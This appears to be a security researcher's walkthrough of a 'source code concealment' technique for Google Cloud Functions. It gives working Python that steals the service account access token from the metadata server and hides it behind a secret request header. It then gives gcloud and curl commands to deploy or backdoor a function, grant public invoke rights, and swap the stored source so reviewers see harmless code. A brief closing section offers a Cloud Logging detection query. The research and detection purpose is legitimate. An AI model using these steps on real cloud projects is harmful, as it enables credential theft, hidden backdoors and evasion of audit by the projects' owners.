# Defense Evasion via Source Code Concealment in Cloud Functions - Attack & Detection

- [Attack](#attack)
  - [Way I - Deploy a Cloud Function in Google Cloud Platform](#way-i---deploy-a-cloud-function-in-google-cloud-platform)
    - [Deploying and Setting IAM Policy to a Cloud Function via gCloud or Cloud Function API (gRPC & REST)](#deploying-and-setting-iam-policy-to-a-cloud-function-via-gcloud-or-cloud-function-api-grpc--rest)
    - [APIs and Permissions required for Concealing the Source Code](#apis-and-permissions-required-for-concealing-the-source-code)
      - [Concealing the Source Code](#concealing-the-source-code)
  - [Way II - Update a Cloud Function in Google Cloud Platform](#way-ii---update-a-cloud-function-in-google-cloud-platform)
    - [Updating and Setting IAM Policy to a Cloud Function via gCloud or Cloud Function API (gRPC & REST)](#updating-and-setting-iam-policy-to-a-cloud-function-via-gcloud-or-cloud-function-api-grpc--rest)
    - [APIs and Permissions required for Concealing the Source Code](#apis-and-permissions-required-for-concealing-the-source-code)
      - [Concealing the Source Code](#concealing-the-source-code-1)
- [Detect](#detect)
    - [GCF Service Agent](#gcf-service-agent)

# Attack

Cloud Functions are a prime target for Privilege Escalation which is evidently clear by past research "[Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md)". One way to detect Cloud Function abuse was to download the source code from Cloud Storage, where it is saved following the Function Deployment or Update process and analyzing it. In this post, I will be introducing an interesting technique I came across while researching [Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md) which can disrupt that detection technique and ultimately prevent any alert. I named this technique "Source Code Concealment".

Cloud Function Source Code Concealment is a technique which enables an attacker to effectively Conceal or Hide malicious source code in Cloud Function by replacing it with non-malicious code. This technique ensures that no artifacts or traces are left behind that could potentially point to the malicious source code ever used, thus letting the attacker evade any security measures and maintain a stealthy presence within the Google Cloud Environment.

Here's a high level overview of the Cloud Function Deployment and Updation process.

<p><img src="https://drive.google.com/uc?id=1TarBMsPnTokDl2ufd8PR3tf2jjsfCk_o"></p> 

Source Code Concealment targets the Storage Object "function-source.zip" within the Cloud Storage Bucket where the source code is saved following the Function Deployment or Update process. In this attack we remove the malicious zip file from the Cloud Storage Bucket and replace it with a non-malicious zip file. This updates the Cloud Function with Non-malicious code but if we invoke the function endpoint it'll execute the malicious code. (depending on the presence of specific [conditions](#we-will-modify-the-malicious-code-now-to-introduce-the-conditions)). The malicious code once deleted from the Cloud Storage will be completely deleted leaving no artifacts or trace behind.

>Note: Even if you upload the source code Locally or via Cloud Repository, it will still be saved in the Cloud Storage Bucket.

Here's a high level overview of the Source Code Concealment process.

<p><img src="https://drive.google.com/uc?id=1aAQCgvDsXLDkJW_TY12xLwLXCtbWd14j"></p>

If an attacker wants to abuse Cloud Function for malicious purpose be it Privilege Escalation, Persistence, Impact etc. they typically have three primary options to choose from:
- Deploy a Cloud Function.
- Update the Cloud Function.
- Delete a Cloud Function.

The primary objective of Deleting a Cloud Function is to create an [Impact](https://attack.mitre.org/tactics/TA0040/) rather than facilitate something important like Privilege Escalation or Persistence etc, moreover there is no point in concealing source code for the function we are going to delete. Thus, we will concentrate on concealing the source code for remaining two strategies:
- Deploy a Cloud Function.
- Update the Cloud Function.

## Way I - Deploy a Cloud Function in Google Cloud Platform

Before you Deploy a Cloud Function make sure you have: 

1. The necessary APIs and Permissions required for Deploying a Cloud Function (gCloud or Cloud Function API (gRPC & REST)).

    - [APIs and Permissions required for Deploying Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-deploying-a-cloud-function-via-gcloud)

    - [APIs and Permissions required for Deploying Cloud Function via Cloud Function API (gRPC & REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-deploying-a-cloud-function-via-cloud-function-api-grpc--rest)

2. The Malicious source code and Non-malicious source code in place.

#### In our case the Malicious and Non-malicious source code are given below:

```python
#Malicious Source Code
#filename: main.py
import requests

def anirban(request):
    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
    metadata_headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_key_url, headers=metadata_headers)
    access_token = response.text
    return access_token
```

```python
#filename: requirements.txt
requests
```
To cover the Malicious Source Code, we'll be using a Non-Malicious source code.

```python
#Non-Malicious Source Code
#filename: main.py
import requests

def anirban(request):
    request_json = request.get_json()
    if request.args and 'message' in request.args:
        return request.args.get('message')
    elif request_json and 'message' in request_json:
        return request_json['message']
    else:
        return f'Hello World!'
```

```python
#filename: requirements.txt
requests
```
Pack the Malicious Source Code (main.py) and requirements.txt into a zip file and upload it to a different Cloud Storage Account (not the same account where you're exploiting the Cloud Function) you have full access to (Editor) and make it public. Copy the gsutil link of the malicious zip file.

Once you have the gsutil URI of the malicious zip file go ahead Deploy a Function via any method (gCloud or Cloud Function API)

### Deploying and Setting IAM Policy to a Cloud Function via gCloud or Cloud Function API (gRPC & REST)

Command to [Deploy Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-gcloud):
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-of-malicious-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```

Command to [Deploy Cloud Function via Cloud Function API (gRPC)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-grpc):
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gs-link-of-malicious-sourcecode> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```

Command to [Deploy Cloud Function via Cloud Function API (REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-rest):
```powershell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-of-malicious-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

#### After Deploying the Function successfully, bind an IAM Policy to the Cloud Function so principals can Invoke it

Command to set an IAM Policy Binding to the Cloud Function via [gCloud](
https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#setting-iam-policy-binding-to-the-cloud-function-via-gcloud)

```powershell

# member:allUsers
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member=allUsers --role=roles/cloudfunctions.invoker

# member:serviceAccount
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member="serviceAccount:<service_account>" --role="roles/cloudfunctions.invoker"

```

Command to set an IAM Policy Binding to the Cloud Function via [Cloud Function API (gRPC)](
https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc)

```powershell

# member:allUsers
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding <principal>

# member:serviceAccount
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding allUsers
```

Command to set an IAM Policy Binding to the Cloud Function via [Cloud Function API (REST)](
https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-rest)

```powershell

# member:allUsers
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"allUsers\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy

# member:serviceAccount
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"serviceAccount:<service-account>\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
We can move into Concealing the Source Code. But to do that we'd require certain permissions to be granted. 

### APIs and Permissions required for Concealing the Source Code

APIs need to enabled:
- None

Permissions required:
- storage.objects.list
- storage.objects.delete
- storage.objects.create

**storage.objects.list** - This permission is required to list the objects in the Cloud Storage Bucket. It is required because the Cloud Storage Object name is in the format of `<function_name>-<unique_identifier>`. We can't figure out the Unique Identifier.

**storage.objects.delete** - This permission is required to delete an object from the Cloud Storage Bucket. Basically it will help replace the Malicious Source Code with the Non-malicious source code. 

**storage.objects.create** - This permission is required to create a new object in the Cloud Storage Bucket. This is required because we will be uploading the Non-Malicious source code to the Cloud Storage Bucket. 

### Concealing the Source Code

>Before moving forward pack the Non-Malicious Source Code (main.py) and requirements.txt into a zip file and rename it "function-source.zip".

>gCloud requires fairly less permissions to conceal the source code. Thus, there is no need to narrow down any permission using Cloud Function API.

There are three steps to conceal the source code via gCloud:

1. List the objects in the bucket "gcf-sources-<project_number>-&lt;region>".

Command:

```powershell
# List the Project ID
gcloud config get-value project

# Convert Project ID to Project Number
gcloud projects describe <project-id> --format="value(projectNumber)"

# List the objects in the bucket
gcloud storage ls gs://gcf-sources-<project_number>-<region> 
```

2. List the objects inside the "<function_name>-<unique_identifier>/version-1" folder in the "gcf-sources-<project_number>-<region>" bucket.

Command:

```powershell
gcloud storage ls gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1
```

3. Copy the Non-Malicious Source Code from Local Machine to the "<function_name>-<unique_identifier>/version-1/" folder in the "gcf-sources-<project_number>-<region>" bucket on Google Cloud Storage. This will replace the Malicious Source Code with the Non-Malicious Source Code.

Command:

```powershell
gcloud storage cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/
# or
gsutils cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/
```

<p><img src="https://drive.google.com/uc?id=1xzQoEFDkcrDgV1DII81hcQH52Oy0hk6X"></p>

Now when the Function is examined the Source Code would look Non-malicious.

<p><img src="https://drive.google.com/uc?id=1FKRS1M8YqT3YdV4VR5AEhAFpyxeE_48n"></p>

Let's invoke the Cloud Function and see which code is being executed.

<p><img src="https://drive.google.com/uc?id=1OAkVb8x-Zq-mD6oe9kZYxRxeN40iQg1j"></p>

Upon looking at the Source Code we can see that the Source Code looks Non-Malicious. But when we invoke the Cloud Function, the Malicious Source Code is being executed. 

Now there's a problem with that. The Cloud Function looks Non-malicious but upon invocation the malicious code is being executed. It does hide the Source Code but still there's an artifact left which is the Malicious Cloud Function Output. If someone invokes or the Cloud Function is triggered by any means the Malicious Code's Output would be revealed, which can raise suspicions. We can give the Role "Cloud Function Invoker" to our principal and give us the only permission to invoke the Cloud Function. But anyone with the required permissions can change the Cloud Function permissions and invoke the Cloud Function. So how do we hide the Malicious output from everyone else?

Well we can modify our code to introduce conditions to check the presence of a certain header and header value in the request. If the header is present and the header value is correct, the malicious code will be executed. If the header is not present or if the header is present but the value is wrong, the non-malicious code will be executed. 

#### We will modify the [Malicious code](#in-our-case-the-malicious-and-non-malicious-source-code-are-given-below) now to introduce the conditions.

```python
# Malicious Source Code
# filename: main.py
import requests

def anirban(request):
    if request.headers.get('my-header') == 'anirban-gcp':
        metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
        metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
        metadata_headers = {"Metadata-Flavor": "Google"}
        response = requests.get(metadata_key_url, headers=metadata_headers)
        access_token = response.text
        return access_token
    else:
        request_json = request.get_json()
        if request.args and 'message' in request.args:
            return request.args.get('message')
        elif request_json and 'message' in request_json:
            return request_json['message']
        else:
            return f'Hello World!'
```

```python
#filename: requirements.txt
requests
```

We will keep the non malicious code the same.

```python
#Non-Malicious Source Code
#filename: main.py
import requests

def anirban(request):
    request_json = request.get_json()
    if request.args and 'message' in request.args:
        return request.args.get('message')
    elif request_json and 'message' in request_json:
        return request_json['message']
    else:
        return f'Hello World!'
```

```python
#filename: requirements.txt
requests
```
Once again, deploy the Cloud Function but this time with the above modified "Malicious Code". Pack the Modified Malicious Source Code (main.py) and requirements.txt into a zip file and upload it to a different Cloud Storage Account you have full access to and make it public. Copy the gsutil link of the modified malicious zip file.

Once you have the gsutil URI of the modified malicious zip file go ahead Deploy a Function via any method (gCloud or Cloud Function API)

Command to [deploy Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-gcloud):
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-of-modified-malicious-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```

Command to [deploy Cloud Function via Cloud Function API (gRPC)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-grpc):
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gs-link-of-modified-malicious-sourcecode> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```

Command to [deploy Cloud Function via Cloud Function API (REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-rest):
```powershell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-of-modified-malicious-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

After Deploying the Function successfully and [Binding an IAM Policy to the Cloud Function](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform) (so principals can Invoke it). Repeat the Step 1, 2 & 3 to [Conceal the Source Code](#concealing-the-source-code-via-gcloud) again. 

Now we can invoke the Function Endpoint and see the output.

```powershell
curl -H "my-header: anirban-gcp" https://<your-region>-<your-project-id>.cloudfunctions.net/<function-name>
```

<p><img src="https://drive.google.com/uc?id=13RnUXX6jVEjIPju3uZvv5XdK0h3mS7yt"></p>

Notice how the malicious output is being returned only when we use the header "my-header" and header value "anirban-gcp". This is a better approach to conceal the Source Code.

Earlier, upon looking the at the Source Code, the **Source Code looked Non-Malicious**. But when we invoke the Cloud Function, the **Malicious Source Code was being executed**.

Now, upon looking the at the Source Code, the **Source Code looks Non-Malicious**. But when we invoke the Cloud Function, the **Non-Malicious Source Code is being executed**.

There is no artifact left of the Malicious Source Code used in the Cloud Function. The Cloud Function Source Code is now properly concealed.

## Way II - Update a Cloud Function in Google Cloud Platform

Before you Update a Cloud Function make sure you have: 

1. The necessary APIs and Permissions required for Updating a Cloud Function (gCloud or Cloud Function API (gRPC & REST)).

    - [APIs and Permissions required for Updating a Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-updating-a-cloud-function-via-gcloud)

    - [APIs and Permissions required for Updating a Cloud Function via Cloud Function API (gRPC & REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/research/Google%20Cloud/Cloud%20Function/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-updating-a-cloud-function-via-cloud-function-api-grpc--rest)

2. The Malicious source code and Non-malicious source code in place.

In case of Updating a Function, the Malicious code and Non-Malicious code would be different from the code used in Deployment.

The Malicious Source code needs to be crafted while the Non-malicious Source code is the Source code of the Target function we want to update.

To craft the Malicious code take the following steps: 

#### I. Download the source code of the function you wish to update

Function source code can be downloaded from the Cloud Storage Bucket of the respective function. 

Permissions Required to list Cloud Storage Objects and download the function-source.zip file.

- storage.objects.list (To list the Objects in the Cloud Storage Bucket)
- storage.objects.get (To download the function-source.zip file in the Cloud Storage Bucket)

Command:

```powershell
# List the Project ID
gcloud config get-value project

# Convert Project ID to Project Number
gcloud projects describe <project-id> --format="value(projectNumber)"

# List the objects in the bucket (If you find more than one function with similar names, use REST API  to give you more information and help you decide which function to modify)
gcloud storage ls gs://gcf-sources-<project_number>-<region> 
# List the objects in the bucket via REST API 
curl -X GET -H "Authorization: Bearer <token>" "https://storage.googleapis.com/storage/v1/b/<bucket_name>/o"

# Identify the function you wish to modify and go inside that object
gcloud storage ls gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/

# Go inside the updated version
gcloud storage ls gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/

# Download the function-source.zip file to current directory
gcloud storage cp gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/function-source.zip .
# or
gsutils cp gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/function-source.zip .
```

> **Note: Do not Delete the Original Source Code, it'll be required later. Please ensure you store a copy of the original code in a separate folder, without modifying it.**

<p><img src="https://drive.google.com/uc?id=11Aa-VBRUFrD2DtjU19bDV5s40EVpTzLL"></p>

#### II. Identify the Entry Point of the target function

You can identify the Entry Point of the target function by looking at the Source Code of the Function, if you can't you can just list the Function details using Cloud Function API (gRPC & REST) and find the entrypoint.

Permissions Required to list the Function details.

- cloudfunctions.functions.list

```powershell
# Cloud Function API (gRPC) - gLess 
git clone https://github.com/anrbn/gLess
cd gLess
py.exe .\main.py --project-id <project-id> --list

# Cloud Function API (REST) - curl
curl -s -H "Authorization: Bearer <token>" -H "Content-Type: application/json" "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/-/functions"
```

<p><img src="https://drive.google.com/uc?id=1XsPgvvrkRoxgbctSbz0YYBJOt07fUfCW"></p>

#### III. Insert the Malicious code using conditions (if-else)

Insert the malicious code using conditional statements (if-else) in the next line after the entry point, import required modules and update the requirements.txt file.  

```python
<entrypoint>():
    if request.headers.get('my-header') == 'anirban-gcp':
        <malicious code>
    else:
        <put the rest of the original code here>
```
<p><img src="https://drive.google.com/uc?id=1IS2RActgusEsQ-Ftwi8hvFQ2cw5TxSA_"></p>

With the Malicious source code ready, we can now update the Cloud Function. Before you update the Malicious source code, make sure you have a copy of the original Cloud Function code that you're targeting, it'll be required in the next step.

Pack the Malicious Source Code (main.py) and requirements.txt into a zip file and upload it to a different Cloud Storage Account (not the same account where you're exploiting the Cloud Function) you have full access to (Editor) and make it public. Copy the gsutil link of the malicious zip file.

Once you have the gsutil URI of the malicious zip file go ahead Update the target Cloud Function via any method (gCloud or Cloud Function API)

### Updating and Setting IAM Policy to a Cloud Function via gCloud or Cloud Function API (gRPC & REST)

```powershell
# gcloud
gcloud functions deploy <target-function-name> --runtime=python38 --source=<gs-link-to-malicious-zipped-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>

# Cloud Function API (gRPC) - gLess
git clone https://github.com/anrbn/gLess
cd gLess
py.exe .\main.py --project-id <project-id> --location <region> --function-name <target-function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --update
```
After successful update of the Cloud Function, Invoke the Cloud Function again to see if it's working as expected and if the Malicious code is executing. 

If you get issues related to permissions during invocation, make sure you have set [IAM Policy binding to the Cloud Function](#after-deploying-the-function-successfully-bind-an-iam-policy-to-the-cloud-function-so-principals-can-invoke-it).

```powershell
# Invoking the Cloud Function
curl https://<your-region>-<your-project-id>.cloudfunctions.net/<function-name>
curl -H "my-header: wrong-header-value" https://<your-region>-<your-project-id>.cloudfunctions.net/<function-name>
curl -H "my-header: header-value" https://<your-region>-<your-project-id>.cloudfunctions.net/<function-name>
```
<p><img src="https://drive.google.com/uc?id=1Y5QkmxVr2w4eS1Wh4r6n5d54ULcq1xED"></p>

Now we are good to go ahead and Conceal the Source Code of the Cloud Function.

### Concealing the Source Code

> We will be needing the Non-Malicious ZIP file. In this case the Non-Malicious ZIP file is the original Cloud Function ZIP code that you downloaded for Modification in [Step I](#i-download-the-source-code-of-the-function-you-wish-to-update).

There are three steps to conceal the source code via gCloud:

1. List the objects in the bucket "gcf-sources-<project_number>-&lt;region>".

Command:

```powershell
# List the Project ID
gcloud config get-value project

# Convert Project ID to Project Number
gcloud projects describe <project-id> --format="value(projectNumber)"

# List the objects in the bucket
gcloud storage ls gs://gcf-sources-<project_number>-<region> 
```

2. List the objects inside the "<function_name>-<unique_identifier>/<updated-version>" folder in the "gcf-sources-<project_number>-<region>" bucket.

Command:

```powershell
gcloud storage ls gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/<updated-version>
```

3. Copy the Non-Malicious Source Code from Local Machine to the "<function_name>-<unique_identifier>/<updated-version>/" folder in the "gcf-sources-<project_number>-<region>" bucket on Google Cloud Storage. This will replace the Malicious Source Code with the Non-Malicious Source Code.

Command:

```powershell
gcloud storage cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/<updated-version>/
# or
gsutils cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/
```

<p><img src="https://drive.google.com/uc?id=1p4KVCV3zhug1Z8FCOi0Pr5nCOmcRvbBo"></p>

Now when the Function is examined the Source Code would look Non-malicious
<p><img src="https://drive.google.com/uc?id=16c3Zih5wig_Rp6UmW_KmKwvolgVDqBoR"></p>

Let's invoke the Cloud Function and see which code is being executed.

<p><img src="https://drive.google.com/uc?id=1Y5QkmxVr2w4eS1Wh4r6n5d54ULcq1xED"></p>

The Source Code has been successfully Concealed once again. Upon looking at the Source Code we can see that the Source Code looks Non-Malicious. And upon invocation the Non-Malicious Source Code is being executed, but if the correct header and header value is present in the request the Malicious code is executed. This is exactly what we wanted. 

>Tip: If you delete the function-source.zip file from Cloud Storage you won't be able to view the Source Code in Cloud Console, but the Cloud Function would work fine.

# Detect

### GCF Service Agent


As I stated above, "there are no artifacts or traces left behind that could potentially point to the malicious source code ever used". If we can never find out the malicious source code how do we even detect this attack? Answer: via Google Cloud Functions (GCF) Service Agent.

The Service Account `service-<project-number>@gcf-admin-robot.iam.gserviceaccount.com` is a Google Cloud Functions (GCF) Service Agent, which is responsible for administrative tasks related to Google Cloud Functions. These tasks include deploying, updating, deleting, and managing function resources, such as uploading and replacing *function-source.zip* files in Cloud Storage. It is a system-generated service account which is created when you enable the Cloud Functions API in your project, and it is managed internally by Google Cloud. It is automatically assigned the necessary permissions to manage resources associated with Google Cloud Functions within the project.

This can be the key factor in detecting the potential "Source Code Concealment" attack. Since the upload and replacement of *function-source.zip* files in Cloud Storage is typically handled by the Google Cloud Functions Service Agent, `service-PROJECT_NUMBER@gcf-admin-robot.iam.gserviceaccount.com`, any actions involving the deletion or replacement of the function-source.zip object in the bucket by an account other than the aforementioned service agent could indicate this attack in play.

Use the following Cloud Logging Query to filters for events where the *function-source.zip* file was not replaced by the Google Cloud Functions (GCF) Service Agent but some other account. This will also help identify any compromised accounts. 

```shell
resource.type="gcs_bucket" AND
protoPayload.serviceName="storage.googleapis.com" AND
protoPayload.authorizationInfo.permission="storage.objects.delete" AND
protoPayload.authorizationInfo.permission="storage.objects.create" AND
protoPayload.authorizationInfo.resource:function-source.zip AND
NOT protoPayload.authenticationInfo.principalEmail:gcf-admin-robot.iam.gserviceaccount.com
```
 
<p><img src="https://drive.google.com/uc?id=14ti24yCTCvAtIfcWIYyXZQRbaEJ6PPZp"></p>

There is a flag called `--impersonate-service-account` which is used to impersonate a service account when executing the command. This is useful in situations where you want to perform actions on behalf of a service account without directly using the service account's key file. 

```powershell
gcloud storage cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/<updated-version>/ --impersonate-service-account <service-account>
```

Now one can argue that adversaries can use the `--impersonate-service-account` flag to copy and replace the source code as the Google Cloud Functions (GCF) Service Agent, thus breaking our detection. We'll the answer is they can't. The GCF Service Agent is non-impersonable and if you try to impersonate it, you'll be getting an error.
